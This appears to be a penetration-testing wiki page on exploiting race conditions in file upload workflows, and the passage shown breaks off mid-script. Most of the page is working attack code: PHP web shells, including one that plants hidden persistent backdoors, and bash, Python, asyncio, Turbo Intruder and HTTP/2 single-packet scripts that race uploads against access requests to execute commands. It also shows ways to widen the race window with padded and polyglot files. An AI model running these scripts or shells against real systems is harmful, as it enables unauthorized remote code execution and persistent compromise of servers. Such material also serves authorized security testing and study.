---
title: Race Condition Upload
description: Exploit time-of-check to time-of-use (TOCTOU) windows in file upload workflows to execute malicious files before server-side validation, deletion, or renaming occurs.
navigation:
  title: Race Condition Upload
---

## Attack Overview

::callout
Race Condition Upload exploits the time gap between when a file is written to disk and when the server performs validation, renaming, or deletion. By sending rapid concurrent requests, an attacker can access and execute an uploaded malicious file within this narrow window — even when the server eventually removes or sanitizes it.
::

::card-group
  ::card
  ---
  title: Core Concept
  ---
  The server saves the uploaded file to a temporary or permanent location, then performs validation (extension check, antivirus scan, image reprocessing). During this gap — often milliseconds to seconds — the raw uploaded file exists on disk and may be directly accessible and executable.
  ::

  ::card
  ---
  title: Impact
  ---
  Remote Code Execution, Web Shell Deployment, Server-Side Request Forgery, Denial of Service, Authentication Bypass, Arbitrary File Write, Persistent Backdoor via race-won execution.
  ::

  ::card
  ---
  title: Vulnerable Patterns
  ---
  Upload-then-validate, upload-then-rename, upload-then-delete, upload-then-move, write-then-scan, temporary file execution, predictable temp filenames, shared storage race conditions.
  ::

  ::card
  ---
  title: Race Window
  ---
  The exploitable time gap ranges from microseconds to several seconds depending on server processing speed, file size, validation complexity, antivirus scanning duration, and image reprocessing time.
  ::
::

## Vulnerable Upload Workflow Patterns

::accordion
  :::accordion-item{label="Pattern 1 — Upload Then Validate (Most Common)"}
  ```
  Timeline:
  ──────────────────────────────────────────────────────
  T0: Client sends POST /upload with shell.php
  T1: Server writes shell.php to /uploads/shell.php        ← FILE EXISTS ON DISK
  T2: Server checks file extension                          ← RACE WINDOW
  T3: Server checks MIME type                               ← RACE WINDOW
  T4: Server checks file content / magic bytes              ← RACE WINDOW
  T5: Server DELETES shell.php (validation failed)
  ──────────────────────────────────────────────────────
  
  EXPLOIT: Send GET /uploads/shell.php between T1 and T5
  ```
  :::

  :::accordion-item{label="Pattern 2 — Upload Then Rename"}
  ```
  Timeline:
  ──────────────────────────────────────────────────────
  T0: Client sends POST /upload with shell.php
  T1: Server writes shell.php to /uploads/shell.php        ← ORIGINAL NAME
  T2: Server generates random name: a8f3b2c1.php           ← RACE WINDOW
  T3: Server renames shell.php → a8f3b2c1.php
  T4: Server returns new filename to client
  ──────────────────────────────────────────────────────
  
  EXPLOIT: Access /uploads/shell.php between T1 and T3
  (before rename, file exists with original name)
  ```
  :::

  :::accordion-item{label="Pattern 3 — Upload Then Move"}
  ```
  Timeline:
  ──────────────────────────────────────────────────────
  T0: Client sends POST /upload with shell.php
  T1: Server writes to /tmp/phpXXXXXX (temp location)     ← TEMP FILE
  T2: Server validates file                                 ← RACE WINDOW
  T3: Server moves to /uploads/sanitized_name.jpg
  ──────────────────────────────────────────────────────
  
  EXPLOIT: Access /tmp/phpXXXXXX between T1 and T3
  (requires knowing or bruting temp path)
  ```
  :::

  :::accordion-item{label="Pattern 4 — Upload Then Reprocess"}
  ```
  Timeline:
  ──────────────────────────────────────────────────────
  T0: Client sends POST /upload with shell.php.jpg
  T1: Server writes shell.php.jpg to /uploads/             ← RAW FILE
  T2: Server runs ImageMagick/GD to reprocess               ← RACE WINDOW
  T3: Server replaces with sanitized image
  T4: Reprocessed clean image now at /uploads/shell.jpg
  ──────────────────────────────────────────────────────
  
  EXPLOIT: Access /uploads/shell.php.jpg between T1 and T3
  (raw file with embedded PHP before reprocessing strips it)
  ```
  :::

  :::accordion-item{label="Pattern 5 — Upload Then Antivirus Scan"}
  ```
  Timeline:
  ──────────────────────────────────────────────────────
  T0: Client sends POST /upload with shell.php
  T1: Server writes shell.php to /uploads/                 ← FILE ON DISK
  T2: Server queues file for AV scan                        ← RACE WINDOW
  T3: AV engine scans file (100ms - 5s)                     ← LARGE WINDOW
  T4: AV flags file → server deletes
  ──────────────────────────────────────────────────────
  
  EXPLOIT: AV scanning creates the LARGEST race window
  Send rapid GET requests during T1-T4 scan period
  ```
  :::

  :::accordion-item{label="Pattern 6 — Double Upload Race (Filename Collision)"}
  ```
  Timeline:
  ──────────────────────────────────────────────────────
  Request A: Upload safe.jpg → passes validation
  Request B: Upload shell.php with same final name
  
  T0-A: Server receives safe.jpg
  T0-B: Server receives shell.php (simultaneous)
  T1-A: Server validates safe.jpg → PASS
  T1-B: Server writes shell.php to /uploads/file.php
  T2-A: Server moves safe.jpg to /uploads/file.php
  ──────────────────────────────────────────────────────
  
  Race: If B's write happens AFTER A's validation but
  BEFORE A's final move, shell.php persists on disk.
  Or if B overwrites A's file after all checks pass.
  ```
  :::
::

## Reconnaissance & Window Identification

### Measure Upload Processing Time

::tabs
  :::tabs-item{label="curl Timing"}
  ```bash
  # Measure total upload processing time
  curl -w "\n\nDNS: %{time_namelookup}s\nConnect: %{time_connect}s\nTLS: %{time_appconnect}s\nStart Transfer: %{time_starttransfer}s\nTotal: %{time_total}s\n" \
    -X POST https://target.com/upload \
    -F "file=@test.jpg;filename=test.jpg" \
    -H "Cookie: session=SESS" \
    -o /dev/null -s

  # Upload large file to widen the race window
  dd if=/dev/urandom of=large_image.jpg bs=1M count=10
  curl -w "\nTotal: %{time_total}s\n" \
    -X POST https://target.com/upload \
    -F "file=@large_image.jpg;filename=large.jpg" \
    -H "Cookie: session=SESS" \
    -o /dev/null -s

  # Compare small vs large file processing time
  for size in 1 5 10 20 50; do
    dd if=/dev/urandom of=test_${size}m.bin bs=1M count=$size 2>/dev/null
    time_taken=$(curl -w "%{time_total}" \
      -X POST https://target.com/upload \
      -F "file=@test_${size}m.bin;filename=test.jpg" \
      -H "Cookie: session=SESS" \
      -o /dev/null -s)
    echo "Size: ${size}MB -> Time: ${time_taken}s"
  done
  ```
  :::

  :::tabs-item{label="Burp Suite Timing"}
  ```yaml
  # In Burp Repeater:
  # 1. Send upload request
  # 2. Note response time in bottom-right corner
  # 3. Compare with different file sizes/types
  #
  # In Burp Logger:
  # 1. Filter by upload endpoint
  # 2. Sort by response time
  # 3. Identify processing overhead for validation
  #
  # Key indicators of race window:
  # - Response time > 100ms (validation processing)
  # - Response time increases with file size
  # - Response time spikes with specific file types (AV scan)
  # - Async processing (immediate response + background job)
  ```
  :::

  :::tabs-item{label="Race Window Detection Script"}
  ```bash
  #!/bin/bash
  # Detect if uploaded files exist temporarily before deletion
  
  TARGET="https://target.com"
  UPLOAD_EP="/upload"
  COOKIE="session=YOUR_SESSION"
  
  # Upload a test file
  echo "RACE_CONDITION_TEST" > race_test.txt
  
  # Start rapid polling BEFORE upload completes
  poll_file() {
    local filename="$1"
    local start=$(date +%s%N)
    for i in $(seq 1 500); do
      code=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/uploads/${filename}" 2>/dev/null)
      elapsed=$(( ($(date +%s%N) - start) / 1000000 ))
      if [ "$code" = "200" ]; then
        echo "[+] File accessible at ${elapsed}ms (attempt $i)"
        return 0
      fi
    done
    echo "[-] File never accessible in polling window"
    return 1
  }
  
  # Run poll in background, then upload
  poll_file "race_test.txt" &
  POLL_PID=$!
  
  sleep 0.1
  
  curl -s -X POST "${TARGET}${UPLOAD_EP}" \
    -F "file=@race_test.txt;filename=race_test.txt" \
    -H "Cookie: ${COOKIE}" > /dev/null
  
  wait $POLL_PID
  
  # Check if file persists
  sleep 2
  final_code=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/uploads/race_test.txt")
  echo "[*] File status after 2s: HTTP ${final_code}"
  [ "$final_code" = "404" ] && echo "[!] File was deleted - RACE WINDOW CONFIRMED"
  ```
  :::
::

### Identify Upload Storage Location

::code-group
```bash [Directory Enumeration]
# Find where uploads land
for dir in uploads tmp media files static assets content data storage temp upload; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${dir}/")
  echo "${dir}/ -> HTTP ${code}"
done

# Check temp directories
for dir in tmp temp .tmp _tmp upload_tmp; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${dir}/")
  echo "${dir}/ -> HTTP ${code}"
done

# Upload a unique file and search for it
UNIQUE="race_$(date +%s%N).txt"
curl -s -X POST https://target.com/upload \
  -F "file=@test.txt;filename=${UNIQUE}" \
  -H "Cookie: session=SESS" > /dev/null

# Search all common paths
for dir in uploads media files static assets tmp temp storage; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${dir}/${UNIQUE}")
  [ "$code" != "404" ] && echo "[FOUND] https://target.com/${dir}/${UNIQUE} -> HTTP ${code}"
done
```

```bash [Response Analysis]
# Upload and examine response for path disclosure
curl -v -X POST https://target.com/upload \
  -F "file=@test.jpg;filename=test.jpg" \
  -H "Cookie: session=SESS" 2>&1 | grep -iE "path|location|url|file|stored|saved|name"

# Check response headers
curl -s -D- -X POST https://target.com/upload \
  -F "file=@test.jpg;filename=test.jpg" \
  -H "Cookie: session=SESS" -o /dev/null | grep -iE "location|x-file|content-location"

# Parse JSON response for file path
curl -s -X POST https://target.com/upload \
  -F "file=@test.jpg;filename=test.jpg" \
  -H "Cookie: session=SESS" | python3 -m json.tool
```

```bash [Predict Temp Filenames]
# PHP tmp files: /tmp/phpXXXXXX (6 random chars)
# Python: /tmp/tmpXXXXXXXX
# Java: uploaded files often in app server temp dir
# Node.js: depends on multer config, often /tmp/ or ./uploads/tmp/

# Upload multiple files rapidly and check naming patterns
for i in $(seq 1 20); do
  response=$(curl -s -X POST https://target.com/upload \
    -F "file=@test.jpg;filename=test_${i}.jpg" \
    -H "Cookie: session=SESS")
  echo "Upload $i: $response"
done | grep -oE '[a-f0-9]{8,}|tmp[A-Za-z0-9]+|php[A-Za-z0-9]+'
```
::

## Core Exploitation Techniques

### Technique 1 — Upload and Race with curl

::steps{level="4"}

#### Prepare the Malicious Shell

```bash
# PHP shell that also creates a persistent backdoor on execution
cat > race_shell.php << 'SHELL'
<?php
// Immediate response for race confirmation
echo "RACE_WON_" . php_uname();

// Persistent backdoor - survives deletion of this file
$backdoor = '<?php system($_GET["cmd"]); ?>';
@file_put_contents('/var/www/html/uploads/.backdoor.php', $backdoor);
@file_put_contents('/tmp/.persistent.php', $backdoor);

// Execute attacker command if provided
if(isset($_GET['cmd'])) {
    echo "\n" . shell_exec($_GET['cmd']);
}
?>
SHELL
```

#### Launch Parallel Upload and Access Requests

```bash
# Terminal 1: Continuous upload loop
while true; do
  curl -s -X POST https://target.com/upload \
    -F "file=@race_shell.php;filename=race_shell.php" \
    -H "Cookie: session=SESS" &
done

# Terminal 2: Continuous access loop (same time)
while true; do
  result=$(curl -s "https://target.com/uploads/race_shell.php")
  if echo "$result" | grep -q "RACE_WON"; then
    echo "[+] RACE CONDITION EXPLOITED!"
    echo "$result"
    break
  fi
done
```

#### Optimized Parallel Approach

```bash
# Using GNU parallel for maximum concurrency
# Upload loop
seq 1 1000 | parallel -j 50 --no-notice \
  'curl -s -X POST https://target.com/upload \
    -F "file=@race_shell.php;filename=race_shell.php" \
    -H "Cookie: session=SESS" > /dev/null 2>&1'

# Simultaneous access loop
seq 1 5000 | parallel -j 100 --no-notice \
  'result=$(curl -s "https://target.com/uploads/race_shell.php" 2>/dev/null); \
   echo "$result" | grep -q "RACE_WON" && echo "[+] WON at attempt {}"'
```

::

### Technique 2 — Burp Suite Turbo Intruder

::warning
Turbo Intruder is the most effective tool for race condition attacks due to its ability to send requests with precise timing using HTTP/2 single-packet attack or HTTP/1.1 last-byte synchronization.
::

::tabs
  :::tabs-item{label="Single Packet Attack (HTTP/2)"}
  ```python
  # Turbo Intruder script - race_upload.py
  # Sends upload + access requests in a single TCP packet (HTTP/2)
  
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2)
      
      # Upload request (modify from captured request)
      upload_request = '''POST /upload HTTP/2
  Host: target.com
  Cookie: session=YOUR_SESSION
  Content-Type: multipart/form-data; boundary=----bound
  
  ------bound
  Content-Disposition: form-data; name="file"; filename="race_shell.php"
  Content-Type: image/jpeg
  
  <?php echo "RACE_WON"; system($_GET["cmd"]); ?>
  ------bound--'''
      
      # Access request
      access_request = '''GET /uploads/race_shell.php?cmd=id HTTP/2
  Host: target.com
  Cookie: session=YOUR_SESSION
  
  '''
      
      # Queue multiple rounds
      for i in range(100):
          # Gate all requests - they wait until released together
          engine.queue(upload_request, gate='race')
          
          # Queue multiple access attempts per upload
          for j in range(10):
              engine.queue(access_request, gate='race')
      
      # Release all requests simultaneously
      engine.openGate('race')
  
  
  def handleResponse(req, interesting):
      table.add(req)
      if 'RACE_WON' in req.response:
          req.label = 'RACE_WON'
  ```
  :::

  :::tabs-item{label="Last-Byte Sync (HTTP/1.1)"}
  ```python
  # Turbo Intruder - last byte synchronization for HTTP/1.1
  # Sends all requests except the last byte, then sends all final bytes together
  
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=30,
                             requestsPerConnection=1,
                             pipeline=False,
                             engine=Engine.THREADED)
      
      upload_req = '''POST /upload HTTP/1.1\r\n\
  Host: target.com\r\n\
  Cookie: session=YOUR_SESSION\r\n\
  Content-Type: multipart/form-data; boundary=----bound\r\n\
  Content-Length: {length}\r\n\
  \r\n\
  ------bound\r\n\
  Content-Disposition: form-data; name="file"; filename="race_shell.php"\r\n\
  Content-Type: image/jpeg\r\n\
  \r\n\
  <?php echo "RACE_WON_".php_uname(); system($_GET["cmd"]); ?>\r\n\
  ------bound--'''
      
      access_req = '''GET /uploads/race_shell.php?cmd=id HTTP/1.1\r\n\
  Host: target.com\r\n\
  Cookie: session=YOUR_SESSION\r\n\
  \r\n'''
      
      for i in range(50):
          engine.queue(upload_req, gate='race')
          for j in range(5):
              engine.queue(access_req, gate='race')
      
      engine.openGate('race')
  
  
  def handleResponse(req, interesting):
      table.add(req)
      if 'RACE_WON' in req.response:
          req.label = 'vuln'
  ```
  :::

  :::tabs-item{label="Adaptive Window Script"}
  ```python
  # Turbo Intruder - adaptive timing with increasing delay
  
  import time
  
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=50,
                             engine=Engine.BURP2)
      
      upload_req = '''POST /upload HTTP/2
  Host: target.com
  Cookie: session=YOUR_SESSION
  Content-Type: multipart/form-data; boundary=----bound
  
  ------bound
  Content-Disposition: form-data; name="file"; filename="race_shell.php"
  Content-Type: image/jpeg
  
  <?php echo "RACE_WON"; @file_put_contents("/var/www/html/uploads/.persist.php","<?php system(\\$_GET['cmd']); ?>"); system($_GET["cmd"]); ?>
  ------bound--'''
      
      access_req = '''GET /uploads/race_shell.php?cmd=id HTTP/2
  Host: target.com
  Cookie: session=YOUR_SESSION
  
  '''
      
      # Multiple rounds with different timing
      for round_num in range(20):
          # Upload batch
          for i in range(5):
              engine.queue(upload_req, gate='race_{}'.format(round_num))
          
          # Access batch - more access attempts than uploads
          for i in range(50):
              engine.queue(access_req, gate='race_{}'.format(round_num))
          
          engine.openGate('race_{}'.format(round_num))
          time.sleep(0.05)  # Small delay between rounds
  
  
  def handleResponse(req, interesting):
      table.add(req)
      if 'RACE_WON' in req.response:
          req.label = 'EXPLOITED'
      if req.status == 200 and 'uid=' in req.response:
          req.label = 'RCE_CONFIRMED'
  ```
  :::
::

### Technique 3 — Python Threading Exploit

::tabs
  :::tabs-item{label="Threading Approach"}
  ```python
  #!/usr/bin/env python3
  """Race Condition Upload Exploit - Threading"""
  
  import requests
  import threading
  import sys
  import time
  from concurrent.futures import ThreadPoolExecutor, as_completed
  
  class RaceUploadExploit:
      def __init__(self, target, upload_path, access_path, cookie):
          self.target = target.rstrip('/')
          self.upload_url = f"{self.target}{upload_path}"
          self.access_url = f"{self.target}{access_path}"
          self.cookie = cookie
          self.found = threading.Event()
          self.shell_content = '<?php echo "RACE_WON_".php_uname(); system($_GET["cmd"]); ?>'
          self.results = []
          
      def upload_file(self, thread_id):
          """Continuously upload malicious file"""
          session = requests.Session()
          session.headers['Cookie'] = self.cookie
          session.verify = False
          
          while not self.found.is_set():
              try:
                  files = {
                      'file': ('race_shell.php', self.shell_content, 'image/jpeg')
                  }
                  session.post(self.upload_url, files=files, timeout=5)
              except:
                  pass
      
      def access_file(self, thread_id):
          """Continuously try to access uploaded file"""
          session = requests.Session()
          session.headers['Cookie'] = self.cookie
          session.verify = False
          
          attempt = 0
          while not self.found.is_set():
              attempt += 1
              try:
                  r = session.get(
                      f"{self.access_url}/race_shell.php",
                      params={'cmd': 'id'},
                      timeout=2
                  )
                  if 'RACE_WON' in r.text or 'uid=' in r.text:
                      self.found.set()
                      self.results.append({
                          'thread': thread_id,
                          'attempt': attempt,
                          'response': r.text[:500]
                      })
                      print(f"\n[+] RACE CONDITION EXPLOITED!")
                      print(f"[+] Thread: {thread_id}, Attempt: {attempt}")
                      print(f"[+] Response: {r.text[:500]}")
                      return True
              except:
                  pass
          return False
      
      def exploit(self, upload_threads=10, access_threads=50, duration=60):
          print(f"[*] Target: {self.target}")
          print(f"[*] Upload URL: {self.upload_url}")
          print(f"[*] Access URL: {self.access_url}")
          print(f"[*] Threads: {upload_threads} upload / {access_threads} access")
          print(f"[*] Duration: {duration}s")
          print(f"[*] Starting race condition attack...\n")
          
          threads = []
          
          # Start upload threads
          for i in range(upload_threads):
              t = threading.Thread(target=self.upload_file, args=(f"UP-{i}",))
              t.daemon = True
              t.start()
              threads.append(t)
          
          # Start access threads
          for i in range(access_threads):
              t = threading.Thread(target=self.access_file, args=(f"AC-{i}",))
              t.daemon = True
              t.start()
              threads.append(t)
          
          # Wait for success or timeout
          self.found.wait(timeout=duration)
          
          if self.results:
              print(f"\n[+] SUCCESS! Race won {len(self.results)} time(s)")
              return True
          else:
              print(f"\n[-] Failed after {duration}s")
              return False
  
  if __name__ == '__main__':
      exploit = RaceUploadExploit(
          target=sys.argv[1],          # https://target.com
          upload_path=sys.argv[2],     # /upload
          access_path=sys.argv[3],     # /uploads
          cookie=sys.argv[4]           # session=abc123
      )
      exploit.exploit(
          upload_threads=10,
          access_threads=50,
          duration=60
      )
  ```
  :::

  :::tabs-item{label="asyncio Approach"}
  ```python
  #!/usr/bin/env python3
  """Race Condition Upload - asyncio for higher concurrency"""
  
  import asyncio
  import aiohttp
  import sys
  import time
  
  class AsyncRaceExploit:
      def __init__(self, target, upload_path, access_path, cookie):
          self.target = target.rstrip('/')
          self.upload_url = f"{self.target}{upload_path}"
          self.access_path = access_path
          self.cookie = cookie
          self.won = False
          self.shell = b'<?php echo "RACE_WON_".php_uname(); system($_GET["cmd"]); ?>'
          
      async def upload_loop(self, session, count=500):
          """Send upload requests"""
          data = aiohttp.FormData()
          data.add_field('file', self.shell,
                        filename='race_shell.php',
                        content_type='image/jpeg')
          
          for i in range(count):
              if self.won:
                  break
              try:
                  async with session.post(self.upload_url, data=data) as resp:
                      await resp.read()
              except:
                  pass
      
      async def access_loop(self, session, count=2000):
          """Send access requests"""
          url = f"{self.target}{self.access_path}/race_shell.php"
          
          for i in range(count):
              if self.won:
                  break
              try:
                  async with session.get(url, params={'cmd': 'id'}) as resp:
                      text = await resp.text()
                      if 'RACE_WON' in text or 'uid=' in text:
                          self.won = True
                          print(f"\n[+] RACE WON at attempt {i}!")
                          print(f"[+] Response: {text[:500]}")
                          return True
              except:
                  pass
          return False
      
      async def exploit(self):
          connector = aiohttp.TCPConnector(
              limit=100,
              ssl=False,
              force_close=False,
              enable_cleanup_closed=True
          )
          
          headers = {'Cookie': self.cookie}
          
          async with aiohttp.ClientSession(
              connector=connector,
              headers=headers
          ) as session:
              # Create mixed upload and access tasks
              tasks = []
              for _ in range(10):
                  tasks.append(self.upload_loop(session, 100))
              for _ in range(50):
                  tasks.append(self.access_loop(session, 500))
              
              await asyncio.gather(*tasks)
          
          if self.won:
              print("[+] Race condition exploit successful!")
          else:
              print("[-] Race condition exploit failed")
  
  if __name__ == '__main__':
      exploit = AsyncRaceExploit(
          target=sys.argv[1],
          upload_path=sys.argv[2],
          access_path=sys.argv[3],
          cookie=sys.argv[4]
      )
      asyncio.run(exploit.exploit())
  ```
  :::

  :::tabs-item{label="Requests with Barrier Sync"}
  ```python
  #!/usr/bin/env python3
  """Barrier-synchronized race condition exploit"""
  
  import requests
  import threading
  import sys
  
  TARGET = sys.argv[1]
  UPLOAD_EP = sys.argv[2]
  ACCESS_EP = sys.argv[3]
  COOKIE = sys.argv[4]
  
  TOTAL_THREADS = 60
  barrier = threading.Barrier(TOTAL_THREADS)
  result_lock = threading.Lock()
  won = False
  
  SHELL = '<?php echo "RACE_WON"; system($_GET["cmd"]); ?>'
  
  def upload_worker(worker_id):
      global won
      s = requests.Session()
      s.headers['Cookie'] = COOKIE
      s.verify = False
      
      for _ in range(50):
          if won:
              return
          # All threads synchronize here before sending
          barrier.wait()
          try:
              s.post(f"{TARGET}{UPLOAD_EP}",
                    files={'file': ('race.php', SHELL, 'image/jpeg')},
                    timeout=5)
          except:
              pass
  
  def access_worker(worker_id):
      global won
      s = requests.Session()
      s.headers['Cookie'] = COOKIE
      s.verify = False
      
      for _ in range(200):
          if won:
              return
          barrier.wait()
          try:
              r = s.get(f"{TARGET}{ACCESS_EP}/race.php",
                       params={'cmd': 'id'}, timeout=2)
              if 'RACE_WON' in r.text:
                  with result_lock:
                      if not won:
                          won = True
                          print(f"[+] RACE WON by worker {worker_id}")
                          print(f"[+] {r.text[:500]}")
          except:
              pass
  
  threads = []
  for i in range(10):
      t = threading.Thread(target=upload_worker, args=(i,))
      threads.append(t)
  for i in range(50):
      t = threading.Thread(target=access_worker, args=(i,))
      threads.append(t)
  
  print(f"[*] Launching {TOTAL_THREADS} synchronized threads...")
  for t in threads:
      t.start()
  for t in threads:
      t.join()
  ```
  :::
::

### Technique 4 — Bash Parallel Exploitation

::code-group
```bash [GNU Parallel]
#!/bin/bash
# race_upload_parallel.sh

TARGET="https://target.com"
UPLOAD_EP="/upload"
ACCESS_PATH="/uploads"
COOKIE="session=YOUR_SESSION"
SHELL='<?php echo "RACE_WON"; system($_GET["cmd"]); ?>'

echo "$SHELL" > /tmp/race_shell.php

# Function: Upload file
upload() {
  curl -s -X POST "${TARGET}${UPLOAD_EP}" \
    -F "file=@/tmp/race_shell.php;filename=race_shell.php" \
    -H "Cookie: ${COOKIE}" \
    -o /dev/null 2>/dev/null
}

# Function: Access file
access() {
  result=$(curl -s "${TARGET}${ACCESS_PATH}/race_shell.php?cmd=id" 2>/dev/null)
  if echo "$result" | grep -q "RACE_WON"; then
    echo "[+] RACE WON!"
    echo "$result"
    # Kill all parallel jobs
    kill 0
  fi
}

export -f upload access
export TARGET UPLOAD_EP ACCESS_PATH COOKIE

echo "[*] Starting race condition attack..."

# Run upload and access in parallel
parallel --no-notice -j 100 ::: \
  $(for i in $(seq 1 200); do echo "upload"; done) \
  $(for i in $(seq 1 1000); do echo "access"; done)
```

```bash [Background Jobs]
#!/bin/bash
# race_upload_bg.sh - Using background processes

TARGET="https://target.com"
UPLOAD_EP="/upload"
ACCESS_PATH="/uploads"
COOKIE="session=YOUR_SESSION"

cat > /tmp/race_shell.php << 'EOF'
<?php echo "RACE_WON_".php_uname(); system($_GET["cmd"]); ?>
EOF

RESULT_FILE="/tmp/race_result_$$"

# Upload worker
upload_worker() {
  while [ ! -f "$RESULT_FILE" ]; do
    curl -s -X POST "${TARGET}${UPLOAD_EP}" \
      -F "file=@/tmp/race_shell.php;filename=race_shell.php" \
      -H "Cookie: ${COOKIE}" -o /dev/null 2>/dev/null
  done
}

# Access worker
access_worker() {
  local id=$1
  while [ ! -f "$RESULT_FILE" ]; do
    result=$(curl -s "${TARGET}${ACCESS_PATH}/race_shell.php?cmd=id" 2>/dev/null)
    if echo "$result" | grep -q "RACE_WON"; then
      echo "$result" > "$RESULT_FILE"
      echo "[+] RACE WON by worker $id"
      echo "$result"
    fi
  done
}

echo "[*] Launching workers..."

# Start 10 upload workers
for i in $(seq 1 10); do
  upload_worker &
done

# Start 50 access workers
for i in $(seq 1 50); do
  access_worker $i &
done

# Wait with timeout
sleep 120

if [ -f "$RESULT_FILE" ]; then
  echo "[+] Exploit successful!"
  cat "$RESULT_FILE"
else
  echo "[-] Timeout reached"
fi

# Cleanup
kill $(jobs -p) 2>/dev/null
rm -f "$RESULT_FILE"
```

```bash [xargs Parallel]
#!/bin/bash
# Using xargs for parallel execution

TARGET="https://target.com"

# Generate upload commands
generate_upload_cmds() {
  for i in $(seq 1 500); do
    echo "curl -s -X POST ${TARGET}/upload -F 'file=@/tmp/race_shell.php;filename=race_shell.php' -H 'Cookie: session=SESS' -o /dev/null"
  done
}

# Generate access commands
generate_access_cmds() {
  for i in $(seq 1 2000); do
    echo "curl -s ${TARGET}/uploads/race_shell.php?cmd=id"
  done
}

# Run both sets interleaved
{ generate_upload_cmds; generate_access_cmds; } | shuf | xargs -P 100 -I {} bash -c '{}'  | grep "RACE_WON"
```
::

### Technique 5 — HTTP/2 Single-Packet Attack

::note
HTTP/2 multiplexing allows sending multiple requests over a single TCP connection in a single packet. This eliminates network jitter and provides the most precise timing synchronization for race conditions.
::

::tabs
  :::tabs-item{label="h2spacex (Python)"}
  ```python
  #!/usr/bin/env python3
  """HTTP/2 Single-Packet Race Condition - h2spacex"""
  # pip install h2spacex
  
  from h2spacex import H2OneTCPConnection
  import sys
  
  target = sys.argv[1]  # target.com (no https://)
  cookie = sys.argv[2]  # session=abc123
  
  SHELL = '<?php echo "RACE_WON_".php_uname(); system($_GET["cmd"]); ?>'
  
  # Build upload request
  boundary = "----RaceBoundary"
  upload_body = f"------RaceBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"race_shell.php\"\r\nContent-Type: image/jpeg\r\n\r\n{SHELL}\r\n------RaceBoundary--"
  
  upload_headers = {
      ":method": "POST",
      ":path": "/upload",
      ":authority": target,
      ":scheme": "https",
      "content-type": f"multipart/form-data; boundary=----RaceBoundary",
      "cookie": cookie,
      "content-length": str(len(upload_body))
  }
  
  access_headers = {
      ":method": "GET",
      ":path": "/uploads/race_shell.php?cmd=id",
      ":authority": target,
      ":scheme": "https",
      "cookie": cookie
  }
  
  # Create connection
  h2_conn = H2OneTCPConnection(target, port_number=443)
  
  # Queue requests - all sent in single packet
  stream_ids = []
  for i in range(5):
      sid = h2_conn.send_request(upload_headers, upload_body, end_stream=True)
      stream_ids.append(('upload', sid))
  
  for i in range(30):
      sid = h2_conn.send_request(access_headers, end_stream=True)
      stream_ids.append(('access', sid))
  
  # Receive responses
  responses = h2_conn.read_responses()
  
  for req_type, sid in stream_ids:
      if sid in responses:
          body = responses[sid].decode('utf-8', errors='ignore')
          if 'RACE_WON' in body or 'uid=' in body:
              print(f"[+] RACE WON on stream {sid} ({req_type})")
              print(f"[+] Response: {body[:500]}")
  
  h2_conn.close()
  ```
  :::

  :::tabs-item{label="curl HTTP/2 Multiplexing"}
  ```bash
  # curl supports HTTP/2 multiplexing with --parallel
  # Upload and access simultaneously over single connection

  # Create config file for parallel requests
  cat > race_requests.txt << 'EOF'
  url = "https://target.com/upload"
  -X POST
  -F "file=@/tmp/race_shell.php;filename=race_shell.php"
  -H "Cookie: session=SESS"
  --next
  url = "https://target.com/uploads/race_shell.php?cmd=id"
  -H "Cookie: session=SESS"
  --next
  url = "https://target.com/uploads/race_shell.php?cmd=id"
  -H "Cookie: session=SESS"
  --next
  url = "https://target.com/uploads/race_shell.php?cmd=id"
  -H "Cookie: session=SESS"
  EOF

  # Run with HTTP/2 multiplexing
  for i in $(seq 1 100); do
    curl --http2 --parallel --parallel-max 20 \
      -K race_requests.txt \
      -s 2>/dev/null | grep -q "RACE_WON" && echo "[+] RACE WON at round $i" && break
  done
  ```
  :::
::

### Technique 6 — Widening the Race Window

::tip
The race window can be artificially widened by increasing server processing time through large file uploads, complex content, or resource exhaustion techniques.
::

::tabs
  :::tabs-item{label="Large File Padding"}
  ```bash
  # Pad shell with large content to slow processing
  # Method 1: Prepend large comment block
  python3 -c "
  shell = '<?php echo \"RACE_WON\"; system(\$_GET[\"cmd\"]); ?>'
  padding = '/*' + 'A' * (10 * 1024 * 1024) + '*/'  # 10MB padding
  print(padding + shell)
  " > padded_shell.php
  
  # Method 2: Embed shell in large valid image
  # Create large JPEG with PHP shell appended
  dd if=/dev/urandom bs=1M count=20 2>/dev/null | \
    cat - <(echo '<?php echo "RACE_WON"; system($_GET["cmd"]); ?>') > large_shell.php.jpg
  
  # Method 3: Use polyglot file
  # JPEG header + PHP code + JPEG padding
  printf '\xFF\xD8\xFF\xE0' > polyglot_shell.php
  dd if=/dev/urandom bs=1M count=15 >> polyglot_shell.php 2>/dev/null
  echo '<?php echo "RACE_WON"; system($_GET["cmd"]); ?>' >> polyglot_shell.php
  
  # Upload padded file (longer processing = wider window)
  curl -X POST https://target.com/upload \
    -F "file=@padded_shell.php;filename=race_shell.php" \
    -H "Cookie: session=SESS"
  ```
  :::

  :::tabs-item{label="Slow Upload (Drip Feed)"}
  ```python
  #!/usr/bin/env python3
  """Slow upload to widen race window - drip feed bytes"""
  
  import socket
  import ssl
  import time
  import threading
  import requests
  
  TARGET = "target.com"
  PORT = 443
  COOKIE = "session=YOUR_SESSION"
  
  def slow_upload():
      """Send upload request byte-by-byte to keep connection open"""
      ctx = ssl.create_default_context()
      ctx.check_hostname = False
      ctx.verify_mode = ssl.CERT_NONE
      
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock = ctx.wrap_socket(sock, server_hostname=TARGET)
      sock.connect((TARGET, PORT))
      
      boundary = "----SlowBoundary"
      shell = '<?php echo "RACE_WON"; system($_GET["cmd"]); ?>'
      
      body = f"------SlowBoundary\r\n"
      body += f'Content-Disposition: form-data; name="file"; filename="race_shell.php"\r\n'
      body += f"Content-Type: image/jpeg\r\n\r\n"
      body += shell + "\r\n"
      body += f"------SlowBoundary--\r\n"
      
      headers = f"POST /upload HTTP/1.1\r\n"
      headers += f"Host: {TARGET}\r\n"
